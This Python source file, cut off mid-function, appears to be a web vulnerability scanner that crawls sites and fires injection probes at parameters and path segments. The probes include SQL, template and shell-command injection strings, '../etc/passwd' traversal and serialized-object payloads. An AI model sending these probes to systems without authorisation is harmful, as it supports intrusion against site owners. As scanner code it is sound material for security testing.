#!/usr/bin/env python3
"""
Smart Vulnerability Crawler & Predictor
Advanced Web Application Security Analysis Tool with Bypass Integration

Features:
- Intelligent crawling with JavaScript analysis
- Technology fingerprinting
- Context-aware vulnerability prediction
- Automatic wordlist mapping
- Priority scoring for attack vectors
- Bypass integration from application_traceroute
- Extended parameter recognition (hash, path, JS, forms)
- Immediate vulnerability testing
- Behavioral Context Analysis
- Multi-type Authentication Support
- Comprehensive JSON output for exploit orchestration
"""

import requests
import re
import json
import time
import urllib.parse
from urllib.parse import urlparse, urljoin, parse_qs
from bs4 import BeautifulSoup
import hashlib
from collections import defaultdict
import threading
import queue
import logging
from typing import Dict, List, Set, Tuple, Optional
import asyncio
import aiohttp
import base64
import random
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import concurrent.futures
import difflib
import os
import itertools
from functools import lru_cache

# Disabilita SSL warnings per security testing
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Optional import for performance monitoring
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    logger.warning("psutil not available - performance monitoring will be limited")

# Optional import for debug logging
try:
    from debug_logger import DebugLogger, DebugSession
    DEBUG_LOGGER_AVAILABLE = True
except ImportError:
    try:
        # Try parent directory (debug_logger is in /core/, crawler is in /core/crawler/)
        import sys
        from pathlib import Path
        parent_dir = str(Path(__file__).parent.parent)
        if parent_dir not in sys.path:
            sys.path.insert(0, parent_dir)
        from debug_logger import DebugLogger, DebugSession
        DEBUG_LOGGER_AVAILABLE = True
    except ImportError:
        DEBUG_LOGGER_AVAILABLE = False
        logger.warning("debug_logger not available - debug mode will be limited")

# Optional import for payload mutation engine
try:
    from extensions.internal_wordlist import PayloadMutationEngine
    MUTATION_ENGINE_AVAILABLE = True
except ImportError:
    try:
        from pathlib import Path
        ext_dir = str(Path(__file__).parent.parent.parent / 'extensions')
        if ext_dir not in sys.path:
            sys.path.insert(0, ext_dir)
        from internal_wordlist import PayloadMutationEngine
        MUTATION_ENGINE_AVAILABLE = True
    except ImportError:
        MUTATION_ENGINE_AVAILABLE = False
        logger.warning("PayloadMutationEngine not available - using static payloads only")

# Optional import for vulnerability verification
try:
    from vulnerability_verifier import VulnerabilityVerifier
    VERIFIER_AVAILABLE = True
except ImportError:
    try:
        # Try parent directory
        from pathlib import Path
        parent_dir = str(Path(__file__).parent.parent)
        if parent_dir not in sys.path:
            sys.path.insert(0, parent_dir)
        from vulnerability_verifier import VulnerabilityVerifier
        VERIFIER_AVAILABLE = True
    except ImportError:
        VERIFIER_AVAILABLE = False
        logger.warning("vulnerability_verifier not available - using basic detection")

# Optional import for taxonomy/classification
try:
    # Try extensions directory (taxonomy is in /extensions/taxonomy/)
    from pathlib import Path
    extensions_dir = str(Path(__file__).parent.parent.parent / 'extensions')
    if extensions_dir not in sys.path:
        sys.path.insert(0, extensions_dir)
    from taxonomy import SelfLearningTaxonomy, TaxonomyDatabase
    TAXONOMY_AVAILABLE = True
except ImportError:
    try:
        # Alternative path
        from extensions.taxonomy import SelfLearningTaxonomy, TaxonomyDatabase
        TAXONOMY_AVAILABLE = True
    except ImportError:
        TAXONOMY_AVAILABLE = False
        logger.warning("taxonomy module not available - using basic classification")

# Optional import for native vulnerability detection (pure Python, no external tools)
try:
    from core.tools import VulnDetector, SQLiDetector, XSSDetector, DetectionResult, PayloadDB
    NATIVE_DETECTOR_AVAILABLE = True
except ImportError:
    try:
        # Try from tools directory
        tools_dir = str(Path(__file__).parent.parent / 'tools')
        if tools_dir not in sys.path:
            sys.path.insert(0, tools_dir)
        from native_detector import VulnDetector, SQLiDetector, XSSDetector, DetectionResult, PayloadDB
        NATIVE_DETECTOR_AVAILABLE = True
    except ImportError:
        NATIVE_DETECTOR_AVAILABLE = False
        PayloadDB = None
        logger.warning("native_detector not available - using basic detection only")


class SemanticResponseDiffer:
    """
    Semantic response comparison that ignores dynamic content.

    Standard difflib.SequenceMatcher treats timestamps, CSRF tokens, session IDs,
    and random nonces as real differences, inflating diff ratios and hiding actual
    vulnerability-induced changes. This class normalizes responses before comparison.
    """

    # Patterns to normalize (replace with placeholders before diffing)
    DYNAMIC_PATTERNS = [
        # CSRF tokens / nonces
        (re.compile(r'(name=["\']?(?:csrf|token|nonce|_token|user_token|csrfmiddlewaretoken)["\']?\s+value=["\']?)([^"\'>\s]+)', re.I),
         r'\1[DYNAMIC_TOKEN]'),
        # Session IDs in HTML
        (re.compile(r'(PHPSESSID|JSESSIONID|ASP\.NET_SessionId|session_id|sid)=([a-zA-Z0-9]{16,})', re.I),
         r'\1=[DYNAMIC_SESSION]'),
        # Timestamps (various formats)
        (re.compile(r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}'), '[DYNAMIC_TIME]'),
        (re.compile(r'\d{2}/\w{3}/\d{4}:\d{2}:\d{2}:\d{2}'), '[DYNAMIC_TIME]'),
        # Unix timestamps
        (re.compile(r'(?<=[=:"\s])\d{10,13}(?=[&"\s,;])'), '[DYNAMIC_TIMESTAMP]'),
        # Random hex/base64 strings in values (likely tokens)
        (re.compile(r'(value=["\'])([a-f0-9]{32,}|[A-Za-z0-9+/]{32,}={0,2})(["\'])', re.I),
         r'\1[DYNAMIC_VALUE]\3'),
        # Cache busters, version hashes
        (re.compile(r'(\?v=|&v=|_=)\d+'), r'\1[DYNAMIC_VERSION]'),
    ]

    @classmethod
    def normalize(cls, text):
        """Strip dynamic content from response text for comparison."""
        for pattern, replacement in cls.DYNAMIC_PATTERNS:
            text = pattern.sub(replacement, text)
        return text

    @classmethod
    def similarity(cls, response_a, response_b):
        """
        Semantic similarity between two responses.
        Returns float 0.0-1.0 (1.0 = identical after normalization).
        """
        if response_a is None or response_b is None:
            return 0.0
        norm_a = cls.normalize(response_a)
        norm_b = cls.normalize(response_b)
        return difflib.SequenceMatcher(None, norm_a, norm_b).ratio()

    @classmethod
    def has_new_content(cls, baseline, response, patterns):
        """
        Check if response contains NEW matches for any regex pattern
        not present in baseline.

        Returns list of (pattern_name, new_match) tuples.
        """
        new_findings = []
        for name, pattern in patterns:
            resp_matches = set(m.group() for m in re.finditer(pattern, response, re.I | re.M))
            if baseline:
                base_matches = set(m.group() for m in re.finditer(pattern, baseline, re.I | re.M))
                new_matches = resp_matches - base_matches
            else:
                new_matches = resp_matches
            for match in new_matches:
                new_findings.append((name, match))
        return new_findings


class RateLimiter:
    """
    Token bucket rate limiter per evitare blocchi IP/WAF.

    Implementa un sistema di rate limiting globale che limita il numero di richieste
    per secondo, distribuendo uniformemente le richieste nel tempo.
    """

    def __init__(self, requests_per_second=5):
        """
        Inizializza il rate limiter.

        Args:
            requests_per_second: Numero massimo di richieste per secondo (default: 5)
        """
        self.rate = requests_per_second
        self.min_interval = 1.0 / self.rate
        self.last_request_time = 0
        self.lock = threading.Lock()

    def wait(self):
        """
        Aspetta il tempo necessario per rispettare il rate limit.
        Thread-safe.
        """
        with self.lock:
            current_time = time.time()
            elapsed = current_time - self.last_request_time

            if elapsed < self.min_interval:
                sleep_time = self.min_interval - elapsed
                time.sleep(sleep_time)
                self.last_request_time = time.time()
            else:
                self.last_request_time = current_time

    def set_rate(self, requests_per_second):
        """Modifica il rate limit dinamicamente"""
        with self.lock:
            self.rate = requests_per_second
            self.min_interval = 1.0 / self.rate


class PerformanceMonitor:
    """
    Monitora performance e risorse durante la scansione.

    Traccia:
    - Tempo totale di esecuzione
    - Numero di payload testati
    - Vulnerabilità trovate
    - Utilizzo memoria (se psutil disponibile)
    - Richieste HTTP effettuate
    """

    def __init__(self):
        """Inizializza il monitor"""
        self.start_time = time.time()
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        self.http_requests = 0
        self.errors = 0
        self.lock = threading.Lock()

    def increment_payloads(self, count=1):
        """Incrementa contatore payload testati"""
        with self.lock:
            self.payloads_tested += count

    def increment_vulnerabilities(self, count=1):
        """Incrementa contatore vulnerabilità trovate"""
        with self.lock:
            self.vulnerabilities_found += count

    def increment_requests(self, count=1):
        """Incrementa contatore richieste HTTP"""
        with self.lock:
            self.http_requests += count

    def increment_errors(self, count=1):
        """Incrementa contatore errori"""
        with self.lock:
            self.errors += count

    def get_stats(self):
        """
        Ritorna statistiche correnti.

        Returns:
            Dictionary con statistiche di performance
        """
        elapsed = time.time() - self.start_time

        stats = {
            'elapsed_seconds': elapsed,
            'elapsed_formatted': self._format_time(elapsed),
            'payloads_tested': self.payloads_tested,
            'vulnerabilities_found': self.vulnerabilities_found,
            'http_requests': self.http_requests,
            'errors': self.errors,
            'requests_per_second': self.http_requests / elapsed if elapsed > 0 else 0,
            'payloads_per_second': self.payloads_tested / elapsed if elapsed > 0 else 0,
        }

        # Aggiungi info memoria se psutil disponibile
        if PSUTIL_AVAILABLE:
            try:
                process = psutil.Process()
                memory_info = process.memory_info()
                stats['memory_mb'] = memory_info.rss / 1024 / 1024
                stats['memory_percent'] = process.memory_percent()
            except Exception as e:
                logger.debug(f"Error getting memory stats: {e}")

        return stats

    def log_stats(self, prefix="Performance"):
        """
        Logga statistiche correnti.

        Args:
            prefix: Prefisso per il messaggio di log
        """
        stats = self.get_stats()

        log_msg = (
            f"{prefix}: {stats['elapsed_formatted']} elapsed, "
            f"{stats['http_requests']} HTTP requests ({stats['requests_per_second']:.1f}/s), "
            f"{stats['payloads_tested']} payloads tested ({stats['payloads_per_second']:.1f}/s), "
            f"{stats['vulnerabilities_found']} vulnerabilities found"
        )

        if 'memory_mb' in stats:
            log_msg += f", Memory: {stats['memory_mb']:.1f}MB ({stats['memory_percent']:.1f}%)"

        if stats['errors'] > 0:
            log_msg += f", Errors: {stats['errors']}"

        logger.info(log_msg)

    def _format_time(self, seconds):
        """Formatta secondi in formato leggibile"""
        if seconds < 60:
            return f"{seconds:.1f}s"
        elif seconds < 3600:
            minutes = seconds / 60
            return f"{minutes:.1f}m"
        else:
            hours = seconds / 3600
            return f"{hours:.1f}h"


class VulnerabilityLogger: 
    """Gestisce il salvataggio immediato delle vulnerabilità rilevate"""
    
    def __init__(self, target_url):
        """Inizializza il logger"""
        parsed_url = urlparse(target_url)
        self.target_domain = parsed_url.netloc. replace(':', '_').replace('.', '_')
        
        self.scan_timestamp = int(time.time())
        self.scan_time_str = time.strftime('%Y-%m-%d %H:%M:%S')
        
        self.results_base = "results"
        self.scan_dir = f"{self.target_domain}_{self.scan_timestamp}"
        self.output_dir = os.path.join(self.results_base, self.scan_dir)
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        self.vuln_file = os.path.join(
            self.output_dir,
            f"vulnerabilities_{self.target_domain}_{self.scan_timestamp}.json"
        )
        
        self.vulnerabilities_data = {
            'target':  target_url,
            'scan_start': self.scan_time_str,
            'vulnerabilities': [],
            'total_vulnerabilities': 0,
            'total_by_type': {},
            'last_updated': self.scan_time_str
        }
        
        self.lock = threading.Lock()
        self._save_to_file()
        
        logger.info(f"✅ VulnerabilityLogger initialized at:  {self.output_dir}")
    
    def _save_to_file(self):
        """Salva i dati in JSON"""
        try:
            with open(self. vuln_file, 'w') as f:
                json.dump(self.vulnerabilities_data, f, indent=2, default=str)
        except Exception as e:
            logger.error(f"Error saving vulnerability file: {e}")
    
    def log_vulnerability(self, 
                         endpoint, 
                         parameter, 
                         payload, 
                         vulnerability_type,
                         bypass_used=None,
                         response_status=None,
                         response_length=None,
                         method='GET',
                         headers=None,
                         confidence=None):
        """
        Registra una vulnerabilità rilevata
        
        Args:
            endpoint: URL dell'endpoint
            parameter: Nome del parametro vulnerabile
            payload: Payload utilizzato
            vulnerability_type:  NOME SPECIFICO della vulnerabilità (XSS, SQLI, LFI, RCE, etc.)
            bypass_used: Tipo di bypass utilizzato (se applicato)
            response_status: HTTP status code della risposta
            response_length: Lunghezza della risposta
            method: HTTP method (GET, POST, PUT, DELETE, etc.)
            headers: Dictionary degli headers della richiesta
            confidence:  Livello di confidenza (0-100)
        """
        with self.lock:
            # Prepara gli headers per il logging (evita informazioni sensibili)
            request_headers = {}
            if headers:
                safe_headers = ['User-Agent', 'Content-Type', 'Accept', 'Accept-Encoding', 
                               'Accept-Language', 'Referer', 'Origin', 'X-Requested-With']
                for key, value in headers.items():
                    if key in safe_headers:
                        request_headers[key] = value
                    elif key == 'Authorization':
                        auth_type = value.split()[0] if ' ' in value else 'Bearer'
                        request_headers['Authorization'] = f"{auth_type} [REDACTED]"
                    elif key == 'Cookie': 
                        request_headers['Cookie'] = "[REDACTED - Contains session data]"
            
            vuln_entry = {
                'id': len(self.vulnerabilities_data['vulnerabilities']) + 1,
                'vulnerability_type': vulnerability_type. upper(),
                'endpoint': endpoint,
                'parameter': parameter,
                'payload': payload,
                'confidence': confidence if confidence is not None else 75,
                'request': {
                    'method': method. upper(),
                    'headers':  request_headers,
                    'body_parameter': parameter
                },
                'response': {
                    'status_code':  response_status,
                    'content_length': response_length
                },
                'bypass': {
                    'used': bypass_used is not None,
                    'type': bypass_used if bypass_used else None
                },
                'timestamps':  {
                    'detected_at': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'unix_timestamp':  int(time.time())
                }
            }
            
            self.vulnerabilities_data['vulnerabilities'].append(vuln_entry)
            
            self. vulnerabilities_data['total_vulnerabilities'] = len(
                self.vulnerabilities_data['vulnerabilities']
            )
            
            if vulnerability_type not in self.vulnerabilities_data['total_by_type']:
                self.vulnerabilities_data['total_by_type'][vulnerability_type] = 0
            self.vulnerabilities_data['total_by_type'][vulnerability_type] += 1
            
            self. vulnerabilities_data['last_updated'] = time.strftime('%Y-%m-%d %H:%M:%S')
            
            self._save_to_file()
            
            logger.info(f"🚨 [{vulnerability_type. upper()}] {endpoint} ? {parameter}={payload[: 30]}")
    
    def get_output_dir(self):
        """Ritorna la directory di output"""
        return self.output_dir
    
    def get_summary(self):
        """Ritorna un riepilogo delle vulnerabilità trovate"""
        return {
            'total':  self.vulnerabilities_data['total_vulnerabilities'],
            'by_type': self.vulnerabilities_data['total_by_type']
        }

    def _detect_method_confusion(self, headers, method):
        """
        Rileva possibili indicatori di Method Confusion
        
        Args:
            headers: Dictionary degli header
            method: Metodo HTTP utilizzato
        
        Returns: 
            Dictionary con i dettagli rilevati
        """
        if not headers:
            return {'detected': False}
        
        confusion_indicators = {}
        
        # Controlla per header di method override
        if 'X-HTTP-Method-Override' in headers: 
            override_method = headers['X-HTTP-Method-Override']
            confusion_indicators['X-HTTP-Method-Override'] = {
                'original_method': method,
                'override_method': override_method,
                'potential_bypass': method != override_method
            }
        
        if 'X-Original-Method' in headers:
            original_method = headers['X-Original-Method']
            confusion_indicators['X-Original-Method'] = {
                'original_method': original_method,
                'used_method': method,
                'potential_bypass': method != original_method
            }
        
        if 'X-Method' in headers:
            x_method = headers['X-Method']
            confusion_indicators['X-Method'] = {
                'x_method': x_method,
                'used_method': method,
                'potential_bypass': method != x_method
            }
        
        # Controlla per POST con query string (Method Confusion comune)
        if method and method.upper() == 'POST' and 'Content-Type' not in headers:
            confusion_indicators['post_without_content_type'] = True
        
        return {
            'detected': len(confusion_indicators) > 0,
            'indicators': confusion_indicators
        }
    
    def get_output_dir(self):
        """Ritorna la directory di output"""
        return self.output_dir
    
    def get_summary(self):
        """Ritorna un riepilogo delle vulnerabilità trovate"""
        return {
            'total':  self.vulnerabilities_data['total_vulnerabilities'],
            'by_type': self.vulnerabilities_data['total_by_type']
        }    
    def get_output_dir(self):
        """Ritorna la directory di output"""
        return self.output_dir
    
    def get_summary(self):
        """Ritorna un riepilogo delle vulnerabilità trovate"""
        return {
            'total':  self.vulnerabilities_data['total_vulnerabilities'],
            'by_type': self.vulnerabilities_data['total_by_type']
        }
    

class LRUCache:
    """
    Implementazione semplice di LRU Cache con limite di dimensione.

    Evita memory leak mantenendo solo le N entry più recenti.
    """

    def __init__(self, maxsize=1000):
        """
        Inizializza cache con limite.

        Args:
            maxsize: Numero massimo di entry da mantenere
        """
        self.maxsize = maxsize
        self.cache = {}
        self.access_order = []  # Track access order for LRU
        self.lock = threading.Lock()

    def __contains__(self, key):
        """Supporta 'in' operator"""
        with self.lock:
            return key in self.cache

    def __getitem__(self, key):
        """Supporta cache[key]"""
        with self.lock:
            if key in self.cache:
                # Move to end (most recently used)
                self.access_order.remove(key)
                self.access_order.append(key)
                return self.cache[key]
            raise KeyError(key)

    def __setitem__(self, key, value):
        """Supporta cache[key] = value"""
        with self.lock:
            # Se già esiste, aggiorna e muovi a fine
            if key in self.cache:
                self.access_order.remove(key)
            # Se raggiungiamo il limite, rimuovi oldest
            elif len(self.cache) >= self.maxsize:
                oldest_key = self.access_order.pop(0)
                del self.cache[oldest_key]

            self.cache[key] = value
            self.access_order.append(key)

    def get(self, key, default=None):
        """Ottieni valore con default"""
        try:
            return self[key]
        except KeyError:
            return default

    def clear(self):
        """Svuota cache"""
        with self.lock:
            self.cache.clear()
            self.access_order.clear()


class BehavioralContextEngine:
    """Deduce vulnerabilities through behavioral analysis, not assumptions"""

    def __init__(self):
        self.cache = LRUCache(maxsize=1000)  # LRU cache con limite per evitare OOM
        self.rate_limit_delay = 0.5  # Delay tra probe requests
        self.technology_hints = {}
        
        self.context_probes = {
            'database_interaction': [
                {'param': '1', 'response_key': 'numeric'},
                {'param': '1abc', 'response_key': 'alphanumeric'},
                {'param': "1'", 'response_key': 'quote'},
                {'param': '1 AND 1=1', 'response_key': 'sql_and'},
                {'param': '1 OR 1=1', 'response_key': 'sql_or'},
                {'param': '999999', 'response_key': 'non_existent_id'}
            ],
            
            'template_engine': [
                {'param': '{{7*7}}', 'response_key': 'jinja2'},
                {'param': '${7*7}', 'response_key': 'velocity'},
                {'param': '<%= 7*7 %>', 'response_key': 'erb'},
                {'param': '#{7*7}', 'response_key': 'el'},
                {'param': '{7*7}', 'response_key': 'simple_bracket'},
                {'param': '[[7*7]]', 'response_key': 'twig'}
            ],
            
            'reflection_context': [
                {'param': 'UNIQUE_MARKER_12345', 'response_key': 'UNIQUE_MARKER_12345', 'analyze': 'position'},
                {'param': '<UNIQUE>', 'response_key': 'html_canary', 'analyze': 'html_encoding'},
                {'param': '"UNIQUE"', 'response_key': 'quoted_canary', 'analyze': 'quote_encoding'},
                {'param': 'javascript:UNIQUE', 'response_key': 'js_protocol', 'analyze': 'js_protocol'},
                {'param': 'style="color:UNIQUE"', 'response_key': 'css_context', 'analyze': 'css_context'}
            ],
            
            'file_operations': [
                {'param': 'test.txt', 'response_key': 'valid_filename'},
                {'param': '../test', 'response_key': 'traversal_basic'},
                {'param': '....//test', 'response_key': 'traversal_encoded'},
                {'param': 'C:\\test', 'response_key': 'windows_path'},
                {'param': '/etc/passwd', 'response_key': 'unix_path'},
                {'param': 'http://test.com/file', 'response_key': 'remote_file'}
            ],
            
            'command_execution': [
                {'param': 'test', 'response_key': 'baseline', 'measure_time': True},
                {'param': 'test;sleep 2', 'response_key': 'sleep_semicolon', 'measure_time': True},
                {'param': 'test|sleep 2', 'response_key': 'sleep_pipe', 'measure_time': True},
                {'param': 'test`sleep 2`', 'response_key': 'sleep_backtick', 'measure_time': True},
                {'param': 'test$(sleep 2)', 'response_key': 'sleep_subshell', 'measure_time': True}
            ],
            
            'xml_parsing': [
                {'param': '<test>data</test>', 'response_key': 'xml_tags'},
                {'param': '<!DOCTYPE test>', 'response_key': 'doctype'},
                {'param': '&entity;', 'response_key': 'entity'},
                {'param': '<?xml version="1.0"?>', 'response_key': 'xml_declaration'}
            ],
            
            'serialization': [
                {'param': 'O:8:"stdClass":0:{}', 'response_key': 'php_serialized'},
                {'param': '{"__proto__":{"test":1}}', 'response_key': 'json_proto'},
                {'param': base64.b64encode(b'\x80\x04\x95\x05\x00\x00\x00\x00\x00\x00\x00]\x94.').decode(), 'response_key': 'python_pickle'},
                {'param': 'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0', 'response_key': 'java_serialized'}
            ]
        }
    
    def set_technology_hints(self, tech_stack):
        """Use technology stack to optimize probes"""
        self.technology_hints = tech_stack
        
        # Adjust probes based on technology
        if tech_stack.get('language') == 'php':
            self.context_probes['template_engine'].append(
                {'param': '<?php echo 7*7; ?>', 'response_key': 'php_tags'}
            )
        elif tech_stack.get('language') == 'java':
            self.context_probes['template_engine'].extend([
                {'param': '${7*7}', 'response_key': 'jsp_el'},
                {'param': '@(7*7)', 'response_key': 'ognl'}
            ])
    
    def get_cache_key(self, url, param_name):
        """Generate cache key for probe results"""
        return hashlib.md5(f"{url}:{param_name}".encode()).hexdigest()
    
    def _send_single_probe(self, session, probe_url, probe_info, rate_limiter=None):
        """
        Invia un singolo probe e ritorna il risultato.

        Helper method per parallelizzazione.
        """
        # Rate limiting se fornito
        if rate_limiter:
            rate_limiter.wait()
        else:
            time.sleep(self.rate_limit_delay)

        response = None
        try:
            # Measure time
            start_time = time.time()
            response = session.get(probe_url, timeout=10, verify=False)
            elapsed = time.time() - start_time

            probe_result = {
                'status': response.status_code,
                'length': len(response.content),
                'time': elapsed,
                'reflection': probe_info['param'] in response.text,
                'headers': dict(response.headers),
                'text_sample': response.text[:500] if response.text else '',
                'response_key': probe_info.get('response_key', 'probe')
            }

            # Special handling for timing attacks
            if probe_info.get('measure_time'):
                probe_result['timing_anomaly'] = elapsed > 1.5

            return probe_result

        except Exception as e:
            logger.debug(f"Probe failed for {probe_info['param']}: {e}")
            return {
                'error': str(e),
                'response_key': probe_info.get('response_key', 'probe')
            }
        finally:
            if response is not None:
                try:
                    response.close()
                except:
                    pass

    def fingerprint_endpoint(self, session, url, param_name, rate_limiter=None, parallel=True, max_workers=5):
        """
        Send smart probes to understand endpoint behavior.

        Args:
            session: requests.Session object
            url: Target URL
            param_name: Parameter name to test
            rate_limiter: Optional RateLimiter object for global rate limiting
            parallel: Se True, esegue probe in parallelo (default: True)
            max_workers: Numero di worker per parallelizzazione (default: 5)

        Returns:
            Dictionary con risultati behavioral analysis
        """
        cache_key = self.get_cache_key(url, param_name)

        # Check cache
        if cache_key in self.cache:
            logger.info(f"Using cached behavioral results for {param_name}")
            return self.cache[cache_key]

        results = {}
        logger.info(f"Starting behavioral fingerprinting for {param_name} (parallel={parallel})")

        for context, probes in self.context_probes.items():
            context_results = {}

            if parallel and len(probes) > 2:
                # ⚡ PARALLELIZZAZIONE: esegui probe in parallelo
                probe_tasks = []

                for probe in probes:
                    # Build probe URL
                    if '?' in url:
                        probe_url = f"{url}&{param_name}={urllib.parse.quote(probe['param'])}"
                    else:
                        probe_url = f"{url}?{param_name}={urllib.parse.quote(probe['param'])}"

                    probe_tasks.append((probe_url, probe))

                # Esegui in parallelo con ThreadPoolExecutor
                with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                    future_to_probe = {
                        executor.submit(self._send_single_probe, session, probe_url, probe_info, rate_limiter): probe_info
                        for probe_url, probe_info in probe_tasks
                    }

                    for future in concurrent.futures.as_completed(future_to_probe):
                        probe_result = future.result()
                        response_key = probe_result.pop('response_key', 'probe')
                        context_results[response_key] = probe_result
            else:
                # SEQUENZIALE: per pochi probe o se parallel=False
                for probe in probes:
                    if rate_limiter:
                        rate_limiter.wait()
                    else:
                        time.sleep(self.rate_limit_delay)

                    response = None
                    try:
                        # Build probe request
                        if '?' in url:
                            probe_url = f"{url}&{param_name}={urllib.parse.quote(probe['param'])}"
                        else:
                            probe_url = f"{url}?{param_name}={urllib.parse.quote(probe['param'])}"

                        # Measure time if needed
                        start_time = time.time()
                        response = session.get(probe_url, timeout=10, verify=False)
                        elapsed = time.time() - start_time

                        probe_result = {
                            'status': response.status_code,
                            'length': len(response.content),
                            'time': elapsed,
                            'reflection': probe['param'] in response.text,
                            'headers': dict(response.headers),
                            'text_sample': response.text[:500] if response.text else ''
                        }

                        # Special handling for timing attacks
                        if probe.get('measure_time'):
                            probe_result['timing_anomaly'] = elapsed > 1.5

                        context_results[probe.get('response_key', 'probe')] = probe_result

                    except Exception as e:
                        logger.debug(f"Probe failed for {probe['param']}: {e}")
                        context_results[probe.get('response_key', 'probe')] = {'error': str(e)}
                    finally:
                        if response is not None:
                            try:
                                response.close()
                            except:
                                pass

            # Analyze behavioral differences
            results[context] = self.analyze_behavior(context, context_results)

        # Cache results
        self.cache[cache_key] = results

        return results
    
    def fingerprint_path_segment(self, session, base_url, segment_index, segment_value, path_segments):
        """Test path segment behavior by replacing it with probes"""
        cache_key = self.get_cache_key(base_url, f"path_{segment_index}")
        
        if cache_key in self.cache:
            logger.info(f"Using cached behavioral results for path segment {segment_index}")
            return self.cache[cache_key]
        
        results = {}
        logger.info(f"Starting behavioral fingerprinting for path segment {segment_index}: {segment_value}")
        
        # Build URLs replacing the segment with probes
        path_probes = {
            'file_operations': [
                {'replacement': '../etc/passwd', 'response_key': 'traversal_attempt'},
                {'replacement': '..\\windows\\system32', 'response_key': 'windows_traversal'},
                {'replacement': segment_value + '%00', 'response_key': 'null_byte'},
                {'replacement': segment_value + '/../', 'response_key': 'traversal_suffix'},
                {'replacement': 'nonexistent123.txt', 'response_key': 'not_found'}
            ],
            'static_serving': [
                {'replacement': segment_value, 'response_key': 'original'},
                {'replacement': segment_value + '?param=value', 'response_key': 'with_params'},
                {'replacement': segment_value + '#anchor', 'response_key': 'with_anchor'}
            ]
        }
        
        for context, probes in path_probes.items():
            context_results = {}
            
            for probe in probes:
                time.sleep(self.rate_limit_delay)
                
                try:
                    # Rebuild URL with probe
                    test_segments = path_segments.copy()
                    test_segments[segment_index] = probe['replacement']
                    test_path = '/' + '/'.join(test_segments)
                    test_url = urljoin(base_url, test_path)
                    
                    response = session.get(test_url, timeout=10, verify=False)
                    
                    context_results[probe['response_key']] = {
                        'status': response.status_code,
                        'length': len(response.content),
                        'content_type': response.headers.get('Content-Type', ''),
                        'headers': dict(response.headers)
                    }
                    
                except Exception as e:
                    logger.debug(f"Probe failed for {probe['replacement']}: {e}")
                    context_results[probe['response_key']] = {'error': str(e)}
            
            results[context] = self.analyze_path_behavior(context, context_results, segment_value)
        
        self.cache[cache_key] = results
        return results
    
    def analyze_path_behavior(self, context, results, original_value):
        """Analyze path segment behavior"""
        
        if context == 'file_operations':
            original = results.get('original', {})
            traversal = results.get('traversal_attempt', {})
            not_found = results.get('not_found', {})
            
            # Static file serving - traversal attempts return 404/400
            if original.get('status') == 200 and traversal.get('status') in [400, 404]:
                # Check if it's actually a static file by content type
                content_type = original.get('content_type', '').lower()
                if any(ct in content_type for ct in ['text/css', 'application/javascript', 'image/', 'font/']):
                    return {'detected': True, 'type': 'static_file', 'confidence': 95}
            
            # Dynamic file handling - traversal might work or error differently
            if original.get('status') == 200 and traversal.get('status') in [403, 500]:
                return {'detected': True, 'type': 'dynamic_file_handler', 'confidence': 85}
        
        elif context == 'static_serving':
            original = results.get('original', {})
            with_params = results.get('with_params', {})
            
            # True static serving ignores parameters
            if original.get('status') == with_params.get('status') and \
               original.get('length') == with_params.get('length'):
                return {'detected': True, 'type': 'static_resource', 'confidence': 90}
        
        return {'detected': False}
    
    def analyze_behavior(self, context, results):
        """Deduce context from behavioral differences"""
        
        if context == 'database_interaction':
            numeric = results.get('numeric', {})
            alpha = results.get('alphanumeric', {})
            quote = results.get('quote', {})
            sql_and = results.get('sql_and', {})
            sql_or = results.get('sql_or', {})
            non_existent = results.get('non_existent_id', {})

            # Check 1: SQL error patterns in body of single-quote probe
            # (DVWA returns 200 with SQL error in body, not status 500)
            sql_error_keywords = [
                'sql syntax', 'mysql_fetch', 'you have an error in your sql',
                'ora-', 'sqlite_error', 'pg_query', 'unclosed quotation',
                'warning.*mysql', 'supplied argument is not a valid mysql',
                'microsoft ole db', 'odbc sql server', 'syntax error at or near',
                'column count', 'unknown column',
            ]
            quote_text = str(quote.get('text_sample', '')).lower()
            if any(kw in quote_text for kw in sql_error_keywords):
                return {'detected': True, 'confidence': 95, 'type': 'sql_injection_confirmed'}

            # Check 2: Status 500/503 on single-quote probe
            if quote.get('status') in [500, 503]:
                return {'detected': True, 'confidence': 90, 'type': 'sql_injection_confirmed'}

            # Check 3: Generic 'sql' in body (PHP warnings, etc.)
            if 'sql' in quote_text:
                return {'detected': True, 'confidence': 80, 'type': 'sql_error_in_body'}

            # Check 4: Size difference for valid vs invalid ID (lowered threshold)
            if abs(numeric.get('length', 0) - non_existent.get('length', 0)) > 100:
                return {'detected': True, 'confidence': 85, 'type': 'database_lookup'}

            # Check 5: Different response for numeric vs alphanumeric
            if numeric.get('status') == 200 and alpha.get('status') in [400, 404]:
                return {'detected': True, 'confidence': 85, 'type': 'numeric_id_validation'}

            # Check 6: Boolean-based behavior (size difference between AND 1=1 and OR 1=1)
            and_len = sql_and.get('length', 0)
            or_len = sql_or.get('length', 0)
            numeric_len = numeric.get('length', 0)
            if and_len > 0 and or_len > 0 and abs(and_len - or_len) > 50:
                return {'detected': True, 'confidence': 88, 'type': 'boolean_based_sql'}

            # Check 7: AND 1=1 returns same content as numeric baseline
            if and_len > 0 and numeric_len > 0 and abs(and_len - numeric_len) < 50:
                or_diff = abs(or_len - numeric_len) if or_len > 0 else 0
                if or_diff > 100:
                    return {'detected': True, 'confidence': 82, 'type': 'boolean_based_sql'}
        
        elif context == 'template_engine':
            # Check if math was evaluated
            for engine, result in results.items():
                if '49' in str(result.get('text_sample', '')):  # 7*7=49
                    return {'detected': True, 'confidence': 99, 'engine': engine, 'type': 'template_injection_confirmed'}
        
        elif context == 'reflection_context':
            marker = results.get('UNIQUE_MARKER_12345', {})
            if marker.get('reflection'):
                text = marker.get('text_sample', '')
                
                # Analyze encoding and context
                if 'UNIQUE_MARKER_12345' in text:
